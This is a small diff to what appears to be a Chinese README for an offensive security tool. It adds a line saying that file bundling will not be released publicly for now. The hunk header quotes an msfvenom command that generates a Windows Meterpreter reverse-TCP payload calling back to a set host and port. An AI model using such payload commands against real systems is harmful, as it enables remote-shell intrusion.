@@ -164,7 +164,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f 
 
 ## 0x06.文件捆绑和上传
 
-
+目前不考虑对外开放文件捆绑功能
 
 
 
